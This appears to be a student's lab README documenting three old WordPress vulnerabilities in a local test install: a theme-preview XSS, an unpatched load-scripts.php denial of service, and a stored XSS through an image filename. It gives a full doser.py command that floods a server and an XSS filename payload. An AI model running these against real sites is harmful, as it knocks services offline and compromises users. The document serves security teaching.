# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Legacy Theme Preview Cross-Site Scripting (XSS)
  - [ ] Summary: One of the callback functions remove the potential for JavaScript to be executed, it removes "onclick='", but continues to run the request without the "onclick='" function. We can use "onmouseover" after the "onclick=" function is removed, allowing us to use XSS. You do have to be an admin to be able to run this, but if you can get the admin to click a malicious link beforehand, it will work.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.4
  - [ ] GIF Walkthrough: https://youtu.be/K7hTDUGLYe8
  - [ ] Steps to recreate: Once you have your script ready, post it as a comment on any post on a WordPress page. Once the comment is posted, either scroll up for the script to be activated, or refresh the page and it will activate. 
  - [ ] Affected source code:
    - [Link 1](https://wpdistillery.vm/wp-admin/includes/theme.php)
2. WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
  - [ ] Summary: WordPress contains a feature that lets a browser load multiple JS/CSS files with a single script (uses load-scripts.php)
                 To prevent DoS attacks, WordPress has protected against a user asking for the same module multiple times in a single                      request. However, if you ask it to load ALL the JS modules, it proceeds with the request, with a response that is 4 MB                    data sent in 2.2 seconds. A python script is written to repeat this requst of ALL the modules, and results in a DoS                        causing the server to become unreachable. 
    - Vulnerability types: DoS - Denial of Service
    - Tested in version: 4.2
    - Fixed in version: Unpatched
  - [ ] GIF Walkthrough: https://youtu.be/O4s8cxdzHQs
  - [ ] Steps to recreate: Download the python script from https://github.com/quitten/doser.py, and run the following command: 
  ```python doser.py -g 'http://mywpserver.com/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999``` The script is now running, and the WordPress site should be unreachable. If you want to stop the script, either close the terminal window or terminate the script using CTRL + C.
  - [ ] Affected source code:
    - [Link 1](https://wpdistillery.vm/wp-admin/load-scripts.php)
3. WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
  - [ ] Summary: This is a stored XSS exploit which uses an image. You insert JavaScript into the name of a JPG file, upload it to your WordPress media library, open up the attachment page of the picture, and the script runs once the broken image icon is clicked. The reason you have to save the image to your library and open it up is because it is a stored XSS exploit. The script only runs once someone clicks the broken image link.
    - Vulnerability types: Stored XSS
    - Tested in version: 4.0
    - Fixed in version: 4.0.13
  - [ ] GIF Walkthrough: https://youtu.be/XSD3R5st3_M
  - [ ] Steps to recreate: You can download any image as a jpg, make the filename ```name<img src=a onclick=alert('string')>.jpg```. Once you have this file downloaded, log onto WordPress as an admin, click "Media" on the left side of the page, and add the picture you made earlier to your library. Click the library again to see your picture uploaded, click on it, click "view attachment page" at the bottom of the page, click the broken image icon, and your XSS will pop up on the screen.  
  - [ ] Affected source code:
    - [Link 1](https://wpdistillery.vm/wp-admin/includes/media.php)

## Assets

Exploit 2 Python Script - https://github.com/quitten/doser.py

## Resources

- [Vagrant](https://www.vagrantup.com/)
- [Exploit 3 Explanation](https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html)
- [Exploit 2 Explanation]
(https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)
- [Exploit 1 Explanation]
(https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html)

GIFs created with [Giphy](https://itunes.apple.com/us/app/giphy-capture-the-gif-maker/id668208984?mt=12).

## Notes

Fun assignment, the exploits did take some trial and error but they did end up working for me. 
## License

    Copyright [2018] [Sevak Papanyan]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
